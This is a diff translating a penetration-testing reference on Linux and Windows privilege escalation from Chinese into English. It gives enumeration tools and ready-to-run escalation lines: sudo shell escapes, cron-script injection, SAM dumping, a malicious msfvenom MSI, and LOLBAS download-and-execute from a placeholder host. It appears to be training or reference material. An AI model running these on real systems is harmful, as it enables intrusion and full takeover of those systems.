@@ -1,35 +1,37 @@
-# 权限提升(Privilege Escalation)
+# Privilege Escalation
 
-> **何时读本文件**:已在目标机获得低权限 shell(Linux/Unix 或 Windows),或需要对系统做本地提权面枚举与审计时。
+**English** · [简体中文](10-privesc.zh-CN.md)
 
-## 快速决策表
+> **When to read this file**: when you already have a low-privilege shell on the target (Linux/Unix or Windows), or when you need to enumerate and audit a system's local privilege escalation surface.
 
-| 任务场景 | 首选工具 | 备选 | 关键区别 |
+## Quick Decision Table
+
+| Scenario | Preferred Tool | Alternatives | Key Difference |
 |---|---|---|---|
-| Linux 低权限 shell 全面枚举 | linpeas | unix-privesc-check | linpeas 覆盖面最广、按颜色分级;unix-privesc-check 极小、专注文件权限类问题 |
-| Windows 低权限 shell 全面枚举 | winPEASx64.exe | 本文件 Windows 手动清单 + PowerUp | winPEAS 一条命令覆盖服务/注册表/令牌;手动清单适合不能落地 EXE 的场景 |
-| 疑似 cron/定时任务提权 | pspy | `cat /etc/crontab` + `systemctl list-timers` | pspy 无需 root 就能看到 root 进程的完整命令行 |
-| 合规/审计视角的系统检查 | lynis | unix-privesc-check | lynis 产出完整报告与加固建议;unix-privesc-check 只列提权向量 |
-| 一次装齐 Linux/Windows/macOS 提权脚本 | peass(apt 包) | 分别从 GitHub release 下载 | apt 单包约 88MB,离线可用 |
-| SUID/sudo 命中已知系统二进制 | GTFOBins(载荷库) | — | 直接查现成滥用命令,不必自己构造 |
-| Windows 命中系统自带二进制执行/下载需求 | LOLBAS | — | certutil/bitsadmin/mshta 等白名单载荷 |
-| 内核或组件版本较旧 | searchsploit(Exploit-DB) | MSF `local_exploit_suggester` | 本地全库检索公开 exploit 并复制利用文件 |
+| Full enumeration from a low-privilege Linux shell | linpeas | unix-privesc-check | linpeas has the widest coverage with color-coded severity; unix-privesc-check is tiny and focused on file-permission issues |
+| Full enumeration from a low-privilege Windows shell | winPEASx64.exe | the Windows manual checklist in this file + PowerUp | winPEAS covers services/registry/tokens in one command; the manual checklist suits scenarios where dropping an EXE is not an option |
+| Suspected cron/scheduled-task privilege escalation | pspy | `cat /etc/crontab` + `systemctl list-timers` | pspy shows the full command lines of root processes without needing root |
+| System check from a compliance/audit perspective | lynis | unix-privesc-check | lynis produces a full report with hardening advice; unix-privesc-check only lists escalation vectors |
+| Install Linux/Windows/macOS privesc scripts all at once | peass (apt package) | download each from GitHub releases | one apt package of about 88MB, usable offline |
+| SUID/sudo hit on a known system binary | GTFOBins (payload library) | — | look up ready-made abuse commands instead of crafting your own |
+| Windows need to execute/download via built-in binaries | LOLBAS | — | whitelisted payloads such as certutil/bitsadmin/mshta |
+| Older kernel or component version | searchsploit (Exploit-DB) | MSF `local_exploit_suggester` | full local search over public exploits with copyable exploit files |
 
-## 提权工作流(方法论)
+## Privilege Escalation Workflow (Methodology)
 
-1. 稳定 shell(Linux):`python3 -c 'import pty; pty.spawn("/bin/bash")'`,再 `export TERM=xterm`(Ctrl+Z 后 `stty raw -echo; fg`)。
-2. 自动化枚举:目标机直接跑 linpeas(Linux)或 winPEAS(Windows),拿到全景。
-3. 手动核对关键面:见下方两个清单——自动工具可能被 EDR 拦截、输出被截断或漏报,关键项必须手动复核。
-4. 每个疑点去对应数据库验证:Linux 二进制 → GTFOBins;Windows 二进制 → LOLBAS;版本漏洞 → Exploit-DB(searchsploit)。
-5. 内核 exploit 放在最后尝试:匹配版本精确、先在本地验证,失败常导致目标宕机、丢失立足点。
+1. Stabilize the shell (Linux): `python3 -c 'import pty; pty.spawn("/bin/bash")'`, then `export TERM=xterm` (after Ctrl+Z, run `stty raw -echo; fg`).
+2. Automated enumeration: run linpeas (Linux) or winPEAS (Windows) directly on the target to get the full picture.
+3. Manually verify key surfaces: see the two checklists below — automated tools may be blocked by EDR, have their output truncated, or miss findings; critical items must be re-checked by hand.
+4. Verify every lead in the matching database: Linux binaries → GTFOBins; Windows binaries → LOLBAS; version vulnerabilities → Exploit-DB (searchsploit).
+5. Try kernel exploits last: match the version exactly and validate locally first — a failed attempt often crashes the target and costs you the foothold.
 
-## 核心工具详解
+## Core Tools in Depth
 
-### linpeas — Linux 本地提权枚举事实标准
+### linpeas — De-facto Standard for Linux Local Privilege Escalation Enumeration
 
-**用途**:PEASS 套件的 Linux 枚举 shell 脚本。一次性检查 SUID/SGID、capabilities、sudo 规则、cron、可写文件、内核版本、NFS、容器逃逸面等数百项,以颜色分级输出(红/黄 ≈ 94% 概率是真实提权路径)。
-**安装**:`sudo apt install peass`(脚本位于 `/usr/share/peass/linpeas/linpeas.sh`)
-**使用场景**:拿到任意低权限 Linux shell 后的第一步;单文件、纯 shell 实现、无依赖,适合传到隔离网络目标执行。
+**Purpose**: the Linux enumeration shell script from the PEASS suite. In one pass it checks hundreds of items — SUID/SGID, capabilities, sudo rules, cron, writable files, kernel version, NFS, container escape surfaces — with color-coded output (red/yellow ≈ 94% probability of a real escalation path).
+**Installation**: `sudo apt install peass` (the script lives at `/usr/share/peass/linpeas/linpeas.sh`)
+**Use cases**: the first step after landing any low-privilege Linux shell; a single file implemented in pure shell with no dependencies, well suited for transfer to targets on isolated networks.
 
 ```bash
 # Kali 上把脚本投递到目标机
@@ -52,17 +54,17 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 ./linpeas.sh -o system_information,users_information,software_information,interesting_files
 ```
 
-**实战要点**:
-- 输出极长:先搜红色区段,再看 `/etc/sudoers`、`SUID`、`Capabilities`、`Cron`、`Writable` 各节的黄色项。
-- 与 GTFOBins 联动:linpeas 列出的每个 SUID/可 sudo 二进制,都去 GTFOBins 查对应标签。
-- 反向 shell 里颜色码会刷屏,务必重定向到文件再用 `less -R` 看。
-- linpeas 只枚举不利用;命中项的利用载荷去 GTFOBins/Exploit-DB 取。
+**Practical tips**:
+- The output is extremely long: search the red sections first, then the yellow items in the `/etc/sudoers`, `SUID`, `Capabilities`, `Cron`, and `Writable` sections.
+- Pair it with GTFOBins: for every SUID/sudoable binary linpeas lists, look up the matching tag on GTFOBins.
+- Color codes flood a reverse shell; always redirect to a file and read it with `less -R`.
+- linpeas only enumerates, it does not exploit; fetch exploitation payloads for hits from GTFOBins/Exploit-DB.
 
-### winPEASx64.exe — Windows 本地提权枚举事实标准
+### winPEASx64.exe — De-facto Standard for Windows Local Privilege Escalation Enumeration
 
-**用途**:PEASS 套件的 Windows 枚举器(C# 编译的独立 EXE)。检查服务(不安全权限/未加引号路径)、注册表凭据、AlwaysInstallElevated、令牌特权、已装软件与补丁、计划任务、可写 PATH 目录等。
-**安装**:`sudo apt install peass`(位于 `/usr/share/peass/winpeas/winPEASx64.exe`,另有 32 位 winPEASx86.exe)
-**使用场景**:Windows 低权限 shell 的第一步;`.exe` 免依赖,`.bat` 版本可在无 exe 执行条件时用。
+**Purpose**: the Windows enumerator from the PEASS suite (a standalone C#-compiled EXE). It checks services (insecure permissions/unquoted paths), registry credentials, AlwaysInstallElevated, token privileges, installed software and patches, scheduled tasks, writable PATH directories, and more.
+**Installation**: `sudo apt install peass` (located at `/usr/share/peass/winpeas/winPEASx64.exe`; there is also the 32-bit winPEASx86.exe)
+**Use cases**: the first step from a low-privilege Windows shell; the `.exe` is dependency-free, and the `.bat` version works when running EXEs is not an option.
 
 ```bash
 # Kali 上投递
@@ -84,17 +86,17 @@ wp.exe quiet notcolor > wp.out
 wp.exe domain log=C:\Temp\wp.log
 ```
 
-**实战要点**:
-- 先看 `whoami /priv` 相关小节:SeImpersonate/SeBackup 等特权是最短路径(见 Windows 清单的特权映射表)。
-- `wmic os get osarchitecture` 先确认 32/64 位再选 EXE 版本。
-- 杀软常标记 winPEAS:被拦时退回本文件的手动清单(全部用系统自带命令)。
-- 命中"不安全服务权限/未加引号服务路径"时,配合 `accesschk` 与 `icacls` 手动确认可写性。
+**Practical tips**:
+- Read the `whoami /priv` related sections first: privileges such as SeImpersonate/SeBackup are the shortest path (see the privilege mapping table in the Windows checklist).
+- Run `wmic os get osarchitecture` to confirm 32/64-bit before choosing the EXE version.
+- Antivirus frequently flags winPEAS: if it is blocked, fall back to the manual checklist in this file (built entirely from system-native commands).
+- On an "insecure service permission/unquoted service path" hit, manually confirm writability with `accesschk` and `icacls`.
 
-### peass — linpeas/winpeas/macpeas 套件包
+### peass — The linpeas/winpeas/macpeas Suite Package
 
-**用途**:Privilege Escalation Awesome Scripts SUITE 的 Kali 元包,一个 apt 包带走 Linux/Windows/macOS 三个平台的枚举工具(约 88MB)。
-**安装**:`sudo apt install peass`
-**使用场景**:在 Kali 上离线备齐三种平台的投递载荷,不必逐个去 GitHub 下载。
+**Purpose**: the Kali metapackage for Privilege Escalation Awesome Scripts SUITE; one apt package delivers enumeration tools for all three platforms — Linux/Windows/macOS (about 88MB).
+**Installation**: `sudo apt install peass`
+**Use cases**: stocking deliverable payloads for all three platforms offline on Kali instead of downloading each one from GitHub.
 
 ```bash
 # 安装后关键文件位置
@@ -107,16 +109,16 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
 ```
 
-**实战要点**:
-- apt 版本随 Kali 滚动更新,落后于 GitHub release;要最新检测规则用 release 直链。
-- 88MB 主要是 winPEAS 多架构二进制;只需 linpeas 时单独 `wget` 脚本即可。
-- 套件仓库还包含各工具的 README,含输出解读与利用建议。
+**Practical tips**:
+- The apt version updates on the Kali rolling cycle and lags behind GitHub releases; use the direct release links for the newest detection rules.
+- The 88MB is mostly multi-architecture winPEAS binaries; if you only need linpeas, simply `wget` the script alone.
+- The suite repository also ships each tool's README with output interpretation and exploitation advice.
 
-### pspy — 无 root 监控 Linux 进程与 cron
+### pspy — Monitor Linux Processes and cron Without root
 
-**用途**:命令行工具,通过轮询 `/proc` 与 inotify 监听,让低权限用户看到其他用户(含 root)实时执行的完整命令行和文件系统事件,不注入任何进程。
-**安装**:`sudo apt install pspy`(含 pspy/pspy32/pspy64 静态二进制)
-**使用场景**:怀疑 cron/systemd timer/其他用户脚本存在提权点(可写脚本、PATH 劫持、命令行带明文密码)时,先观察再动手。
+**Purpose**: a command-line tool that polls `/proc` and listens via inotify, letting a low-privilege user see the full command lines other users (including root) execute in real time plus filesystem events, without injecting into any process.
+**Installation**: `sudo apt install pspy` (includes the static binaries pspy/pspy32/pspy64)
+**Use cases**: when you suspect an escalation point in cron/systemd timers/other users' scripts (writable scripts, PATH hijacking, plaintext passwords on command lines) — observe first, then act.
 
 ```bash
 # 目标机:常驻运行,实时输出新进程命令行与文件事件
@@ -132,17 +134,17 @@ grep "UID=0" pspy.log
 ./pspy64 -h
 ```
 
-**实战要点**:
-- 与静态 cron 配置互补:`crontab -l` 看不到 root 的条目时,pspy 能直接捕获执行现场。
-- root 脚本调用"不带绝对路径的命令"且该目录可写 → PATH 劫持;pspy 确认执行环境后投递同名恶意文件。
-- 备份脚本命令行常带数据库明文密码,是横向/提权的直接凭据来源。
-- 输出量大时务必落盘,再按 UID/CMD/时间窗过滤。
+**Practical tips**:
+- Complements static cron configuration: when `crontab -l` cannot see root's entries, pspy captures the executions live.
+- A root script invokes "a command without an absolute path" and that directory is writable → PATH hijacking; once pspy confirms the execution context, drop a malicious file with the same name.
+- Backup script command lines often carry plaintext database passwords — a direct credential source for lateral movement/escalation.
+- When output is heavy, always log to disk, then filter by UID/CMD/time window.
 
-### lynis — 系统安全审计(Linux/Unix)
+### lynis — System Security Auditing (Linux/Unix)
 
-**用途**:审计与加固工具,扫描系统配置并输出系统信息概览、WARNING(安全问题)与 SUGGESTION(加固建议),支持非交互模式做自动化审计。
-**安装**:`sudo apt install lynis`
-**使用场景**:需要审计视角的报告输出(渗透报告的"系统加固建议"章节),或目标环境只允许温和的配置检查;攻击性枚举优先 linpeas。
+**Purpose**: an auditing and hardening tool that scans system configuration and outputs a system-information overview, WARNINGs (security issues) and SUGGESTIONs (hardening advice), with a non-interactive mode for automated audits.
+**Installation**: `sudo apt install lynis`
+**Use cases**: when you need audit-style report output (the "system hardening recommendations" section of a pentest report), or the target environment only permits gentle configuration checks; for offensive enumeration prefer linpeas.
 
 ```bash
 # 官网示例:快速模式(-Q)+ cronjob 格式(非交互、无按键确认)
@@ -159,17 +161,17 @@ sudo grep -E "warning|suggestion" /var/log/lynis-report.dat
 sudo lynis show details <test-id>     # 例:SSH-7408
 ```
 
-**实战要点**:
-- root 运行覆盖面远大于普通用户(能读更多文件);普通用户跑会提示跳过多项测试。
-- 报告在 `/var/log/lynis-report.dat`,日志在 `/var/log/lynis.log`。
-- 对提权有价值的输出:弱文件权限、可写配置、过期内核/组件、无密码账户、错误 sudo 配置。
-- `--quick` 跳过深度测试,适合时间受限的快速体检。
+**Practical tips**:
+- Running as root covers far more than a normal user (it can read more files); running as a normal user reports many skipped tests.
+- The report lands at `/var/log/lynis-report.dat` and the log at `/var/log/lynis.log`.
+- Outputs valuable for escalation: weak file permissions, writable configurations, outdated kernels/components, passwordless accounts, misconfigured sudo.
+- `--quick` skips deep tests — good for a time-boxed quick health check.
 
-### unix-privesc-check — 轻量文件权限提权检查脚本
+### unix-privesc-check — Lightweight File-Permission Privesc Check Script
 
-**用途**:pentestmonkey 出品的单一 shell 脚本,检查文件权限等可能导致本地用户提权或访问本地应用(如数据库)的错误配置,输出中搜 `WARNING` 即问题项。
-**安装**:`sudo apt install unix-privesc-check`(仅 85KB)
-**使用场景**:目标空间/流量受限装不下 linpeas 时;或作为 linpeas 的第二意见交叉验证文件权限类发现。单脚本、无需解压编译,可直接上传执行。
+**Purpose**: a single shell script from pentestmonkey that checks file permissions and other misconfigurations that could let a local user escalate privileges or access local applications (such as databases); search the output for `WARNING` to find issues.
+**Installation**: `sudo apt install unix-privesc-check` (only 85KB)
+**Use cases**: when the target is too constrained in space/bandwidth for linpeas; or as a second opinion to cross-check file-permission findings from linpeas. A single script, no unpacking or compiling — upload and run directly.
 
 ```bash
 # 官网示例:standard 模式
@@ -185,15 +187,15 @@ unix-privesc-check standard | grep -i warning
 cp /usr/bin/unix-privesc-check . && sudo python3 -m http.server 80
 ```
 
-**实战要点**:
-- root 运行检查更全(可读更多文件),但以普通用户身份运行的结果才是该用户真实可用的提权面——两种都值得跑。
-- 输出没有 linpeas 的颜色分级,检索 `WARNING` 关键字是唯一的问题定位方式。
-- 专长是路径权限(可写的脚本、可读的配置、弱 umask),不含内核漏洞与凭据搜索。
-- 支持 Solaris/HP-UX/FreeBSD 等非 Linux Unix,是老系统的少数可用选项。
+**Practical tips**:
+- Running as root checks more (it can read more files), but the results from a normal user reflect that user's truly usable escalation surface — worth running both ways.
+- The output lacks linpeas's color grading; grepping the `WARNING` keyword is the only way to locate issues.
+- Its specialty is path permissions (writable scripts, readable configurations, weak umask); it does not cover kernel vulnerabilities or credential searches.
+- It supports non-Linux Unixes such as Solaris/HP-UX/FreeBSD — one of the few usable options on legacy systems.
 
-## Linux 提权检查清单(手动命令)
+## Linux Privilege Escalation Checklist (Manual Commands)
 
-### 1. 内核与系统信息 → 决定是否走内核漏洞
+### 1. Kernel and System Information → Decide Whether to Pursue a Kernel Vulnerability
 
 ```bash
 uname -a                       # 内核版本 + 架构
@@ -202,18 +204,18 @@ ps auxww | head -30            # 关键进程
 dpkg -l 2>/dev/null | wc -l    # 软件包规模(决定凭据搜索面)
 ```
 
-内核/组件版本命中下表时,直接 `searchsploit` 取利用:
+If the kernel/component version matches a row below, pull the exploit directly with `searchsploit`:
 
-| 版本范围 | 漏洞代号 | CVE | 要点 |
+| Version Range | Vulnerability Name | CVE | Notes |
 |---|---|---|---|
-| Linux 2.6.22 – 4.8.3 | Dirty COW | CVE-2016-5195 | 写时复制竞争,可改只读文件(如 /etc/passwd) |
-| Linux 5.8 – 5.16.11 / 5.15.25 / 5.10.102 | Dirty Pipe | CVE-2022-0847 | pipe 标志位错误,覆写只读文件 |
-| pkexec(polkit)2022-01 补丁前 | PwnKit | CVE-2021-4034 | env 注入,几乎所有发行版预装 |
-| glibc ≤ 2.38(2023-10 补丁前) | Looney Tunables | CVE-2023-4911 | GLIBC_TUNABLES 环境变量溢出 |
-| sudo 1.8.2–1.8.32p2 / 1.9.0–1.9.5p1 | Baron Samedit | CVE-2021-3156 | 栈溢出,无需交互、无需已知密码 |
-| Ubuntu OverlayFS 内核(2023 补丁前) | OverlayFS PE | CVE-2023-2640 + CVE-2023-32229 | 双 CVE 组合,Ubuntu 特有 |
+| Linux 2.6.22 – 4.8.3 | Dirty COW | CVE-2016-5195 | copy-on-write race that can modify read-only files (e.g. /etc/passwd) |
+| Linux 5.8 – 5.16.11 / 5.15.25 / 5.10.102 | Dirty Pipe | CVE-2022-0847 | pipe flag bug that overwrites read-only files |
+| pkexec (polkit) before the 2022-01 patch | PwnKit | CVE-2021-4034 | env injection; preinstalled on almost every distro |
+| glibc ≤ 2.38 (before the 2023-10 patch) | Looney Tunables | CVE-2023-4911 | GLIBC_TUNABLES environment variable overflow |
+| sudo 1.8.2–1.8.32p2 / 1.9.0–1.9.5p1 | Baron Samedit | CVE-2021-3156 | stack overflow; no interaction, no known password needed |
+| Ubuntu OverlayFS kernels (before the 2023 patch) | OverlayFS PE | CVE-2023-2640 + CVE-2023-32229 | a dual-CVE combination, Ubuntu-specific |
 
-### 2. SUID/SGID 与 capabilities → 对照 GTFOBins
+### 2. SUID/SGID and capabilities → Cross-check Against GTFOBins
 
 ```bash
 find / -type f -perm -04000 2>/dev/null        # SUID
@@ -222,10 +224,10 @@ find / -type f -perm -06000 2>/dev/null        # SUID+SGID
 getcap -r / 2>/dev/null                        # 文件 capabilities
 ```
 
-- 每个命中二进制去 GTFOBins 查 "SUID" / "Capabilities" 标签。
-- `cap_setuid` 命中(如 perl)可直接:`perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'`
+- For every binary hit, look up the "SUID" / "Capabilities" tags on GTFOBins.
+- A `cap_setuid` hit (e.g. perl) works directly: `perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'`
 
-### 3. sudo 规则 → 最常见的低垂果实
+### 3. sudo Rules → The Most Common Low-Hanging Fruit
 
 ```bash
 sudo -l                            # 当前用户可 sudo 执行的命令
@@ -234,14 +236,14 @@ cat /etc/sudoers 2>/dev/null
 ls -la /etc/sudoers.d/ 2>/dev/null
 ```
 
-- `(root) NOPASSWD: /usr/bin/<bin>` → GTFOBins "Sudo" 标签取载荷,例如:
+- `(root) NOPASSWD: /usr/bin/<bin>` → grab payloads from the GTFOBins "Sudo" tag, for example:
   - `sudo find . -exec /bin/sh \; -quit`
   - `sudo vim -c ':!/bin/sh'`
   - `sudo awk 'BEGIN {system("/bin/sh")}'`
-  - `sudo less /etc/shadow`(进入后输入 `!sh`)
-- 规则为 `(ALL, !root)` 且 sudo < 1.8.28 时可 `sudo -u#-0 <cmd>` 绕过(CVE-2019-14287)。
+  - `sudo less /etc/shadow` (type `!sh` once inside)
+- When the rule is `(ALL, !root)` and sudo < 1.8.28, bypass with `sudo -u#-0 <cmd>` (CVE-2019-14287).
 
-### 4. cron 与定时任务 → pspy 观察执行现场
+### 4. cron and Scheduled Tasks → Watch Executions Live with pspy
 
 ```bash
 crontab -l 2>/dev/null
@@ -250,10 +252,10 @@ ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cr
 systemctl list-timers --all 2>/dev/null
 ```
 
-- root 的 cron 脚本本身可写 → 直接注入:`echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> <writable-root-script>`
-- root 脚本调用不带绝对路径的命令且 PATH 含可写目录 → 放同名恶意文件做 PATH 劫持(`echo $PATH` 确认顺序)。
+- A writable root cron script itself → inject directly: `echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> <writable-root-script>`
+- A root script calls a command without an absolute path and PATH contains a writable directory → drop a same-named malicious file for PATH hijacking (confirm the order with `echo $PATH`).
 
-### 5. 可写文件/目录与挂载
+### 5. Writable Files/Directories and Mounts
 
 ```bash
 find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50
@@ -262,9 +264,9 @@ mount | grep -i "no_suid\|nosuid"               # 反查允许 SUID 的挂载
 cat /etc/exports                                 # NFS no_root_squash = 即时 root
 ```
 
-- NFS `no_root_squash` 利用(攻击机侧):`sudo mount -t nfs <ip>:/<share> /mnt/nfs`,以 root 放入 SUID bash,再回目标机执行。
+- NFS `no_root_squash` exploitation (attacker side): `sudo mount -t nfs <ip>:/<share> /mnt/nfs`, place a SUID bash as root, then go back to the target and execute it.
 
-### 6. 用户、组与凭据残留
+### 6. Users, Groups, and Credential Leftovers
 
 ```bash
 id                                   # docker/lxd/disk 组都有对应即时提权
@@ -275,11 +277,11 @@ find / -name "id_rsa" -o -name "*.pem" -o -name "*.kdbx" 2>/dev/null | head
 env | grep -iE "pass|secret|token|key"
 ```
 
-- docker 组:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`(chroot 后即 root)。
+- docker group: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (root right after the chroot).
 
-## Windows 提权检查清单(手动命令)
+## Windows Privilege Escalation Checklist (Manual Commands)
 
-### 1. 系统信息与补丁水平
+### 1. System Information and Patch Level
 
 ```cmd
 systeminfo
@@ -290,33 +292,33 @@ net user
 net localgroup administrators
 ```
 
-- `systeminfo > sysinfo.txt` 后可用 windows-exploit-suggester(`--systeminfo sysinfo.txt`)比对缺失补丁。
-- meterpreter 会话内:`run post/multi/recon/local_exploit_suggester` 自动建议本地提权模块。
+- After `systeminfo > sysinfo.txt`, use windows-exploit-suggester (`--systeminfo sysinfo.txt`) to match missing patches.
+- Inside a meterpreter session: `run post/multi/recon/local_exploit_suggester` automatically suggests local escalation modules.
 
-### 2. 令牌特权(whoami /priv)→ 特权映射表
+### 2. Token Privileges (whoami /priv) → Privilege Mapping Table
 
-| 特权 | 提权路径 |
+| Privilege | Escalation Path |
 |---|---|
-| SeImpersonatePrivilege | Potato 系列(服务账户 IIS/MSSQL 常见),见下表 |
-| SeAssignPrimaryTokenPrivilege | 同样可用 Potato 系列载荷 |
-| SeBackupPrivilege | `reg save hklm\sam sam.hiv` + `reg save hklm\system system.hiv` 导出后离线破解 |
-| SeRestorePrivilege | 任意覆盖系统文件(替换服务二进制) |
-| SeTakeOwnershipPrivilege | 接管任意文件所有权(如替换 utilman.exe) |
-| SeLoadDriverPrivilege | 加载已知漏洞驱动(如 Capcom.sys) |
-| SeDebugPrivilege | 打开/迁移 SYSTEM 进程,转储 LSASS |
+| SeImpersonatePrivilege | the Potato family (common for service accounts such as IIS/MSSQL), see the table below |
+| SeAssignPrimaryTokenPrivilege | also works with Potato-family payloads |
+| SeBackupPrivilege | export with `reg save hklm\sam sam.hiv` + `reg save hklm\system system.hiv`, then crack offline |
+| SeRestorePrivilege | overwrite any system file (replace a service binary) |
+| SeTakeOwnershipPrivilege | take ownership of any file (e.g. replace utilman.exe) |
+| SeLoadDriverPrivilege | load a known-vulnerable driver (e.g. Capcom.sys) |
+| SeDebugPrivilege | open/migrate into SYSTEM processes, dump LSASS |
 
-- SeBackup 导出后的离线破解(攻击机):`impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL`
+- Offline cracking after a SeBackup export (attacker side): `impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL`
 
-Potato 系列选择(均需 SeImpersonate 类特权):
+Choosing within the Potato family (all require an SeImpersonate-class privilege):
 
-| 工具 | 适用条件 |
+| Tool | Applicable Conditions |
 |---|---|
-| JuicyPotato | Win10 1809 / Server 2019 之前,且 135 或 5985 端口可用 |
-| RoguePotato | 较新系统,需要一台可中继的远程机器 |
-| PrintSpoofer | Print Spooler 服务运行中 |
-| GodPotato | Win Server 2012–2022 广谱版本 |
+| JuicyPotato | before Win10 1809 / Server 2019, with port 135 or 5985 available |
+| RoguePotato | newer systems; needs a remote machine available for relaying |
+| PrintSpoofer | Print Spooler service running |
+| GodPotato | broad-spectrum version for Windows Server 2012–2022 |
 
-### 3. 服务提权面
+### 3. Service Escalation Surface
 
 ```cmd
 wmic service get name,displayname,pathname,startmode | findstr /vi "windows"
@@ -324,18 +326,18 @@ schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
 wmic startup get caption,command
 ```
 
-- 未加引号且带空格的服务路径 + 上级目录可写 → 放恶意 EXE 劫持服务名。
-- 服务二进制/配置可写检测(Sysinternals):`accesschk64.exe /accepteula -uwcqv "Authenticated Users" *`
-- 目录 ACL 检查:`icacls "C:\Program Files\<dir>"`(关注 `(F)`/`(M)` 且主体含 Users/Everyone)。
+- Unquoted service path containing spaces + writable parent directory → drop a malicious EXE to hijack the service name.
+- Writable service binary/config check (Sysinternals): `accesschk64.exe /accepteula -uwcqv "Authenticated Users" *`
+- Directory ACL check: `icacls "C:\Program Files\<dir>"` (watch for `(F)`/`(M)` with a principal of Users/Everyone).
 
-### 4. AlwaysInstallElevated(MSI 以 SYSTEM 安装)
+### 4. AlwaysInstallElevated (MSI Installed as SYSTEM)
 
 ```cmd
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-- 两处均为 `0x1` 时可利用。攻击机生成 MSI:
+- Exploitable when both values are `0x1`. Generate the MSI on the attacker box:
 
 ```bash
 msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o setup.msi
@@ -346,7 +348,7 @@ msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f 
 msiexec /quiet /qn /i C:\Temp\setup.msi
 ```
 
-### 5. 凭据与注册表残留
+### 5. Credential and Registry Leftovers
 
 ```cmd
 cmdkey /list
@@ -357,17 +359,17 @@ dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
 wmic product get name,version
 ```
 
-- PowerShell 历史文件常含以明文出现的密码;`runas /savecred` 无需密码即可用已存凭据执行任意程序。
+- PowerShell history files often contain passwords in plaintext; `runas /savecred` runs arbitrary programs with stored credentials, no password needed.
 
-## 发现可利用点之后:去哪里查
+## After Finding an Exploitable Issue: Where to Look
 
-| 数据库 | 地址 | 何时查 |
+| Database | URL | When to Query |
 |---|---|---|
-| GTFOBins | https://gtfobins.github.io | Linux 上 SUID/SGID、sudo、capabilities 命中的合法二进制,取现成滥用载荷 |
-| LOLBAS | https://lolbas-project.github.io | Windows 上可执行/下载/持久化的系统自带二进制与脚本 |
-| Exploit-DB | 本地 searchsploit(apt 包 exploitdb,Kali 默认已装) | 按内核、sudo/polkit 等组件版本检索公开 exploit |
-| PEASS-ng | https://github.com/peass-ng/PEASS-ng | linpeas/winPEAS 最新版与输出解读 |
-| Metasploit | `post/multi/recon/local_exploit_suggester` | meterpreter 会话内自动匹配本地提权模块 |
+| GTFOBins | https://gtfobins.github.io | legitimate binaries hit via SUID/SGID, sudo, or capabilities on Linux; grab ready-made abuse payloads |
+| LOLBAS | https://lolbas-project.github.io | built-in Windows binaries and scripts for execution/download/persistence |
+| Exploit-DB | local searchsploit (apt package exploitdb, preinstalled on Kali) | search public exploits by kernel and component versions such as sudo/polkit |
+| PEASS-ng | https://github.com/peass-ng/PEASS-ng | the latest linpeas/winPEAS releases and output interpretation |
+| Metasploit | `post/multi/recon/local_exploit_suggester` | auto-matches local escalation modules inside a meterpreter session |
 
 ```bash
 # searchsploit 典型检索与取用
@@ -378,7 +380,7 @@ searchsploit -m <exploit-id>      # 把利用文件复制到当前目录
 searchsploit -u                   # 更新漏洞数据库
 ```
 
-LOLBAS 常用载荷(下载与执行均用系统自带二进制,常用于绕过脚本限制):
+Common LOLBAS payloads (download and execution both use built-in binaries, often to bypass script restrictions):
 
 ```cmd
 :: certutil 下载
@@ -394,12 +396,12 @@ mshta.exe http://<ip>/evil.hta
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe
 ```
 
-## 其余工具速查
+## Remaining Tools — Quick Reference
 
-| 工具 | 一句话用途 | 安装包 | 最常用命令 |
+| Tool | One-line Purpose | Package | Most Common Command |
 |---|---|---|---|
-| pspy-binaries | pspy 的预编译二进制集(与 pspy 同包,含 pspy32/pspy64 等多架构版本) | pspy | `./pspy64 > pspy.log 2>&1 &` |
+| pspy-binaries | precompiled binary set for pspy (same package as pspy, including multi-architecture versions such as pspy32/pspy64) | pspy | `./pspy64 > pspy.log 2>&1 &` |
 
 ---
 
-本文档仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景。
+This file is for penetration testing with written authorization, CTF competitions, and security education scenarios only.
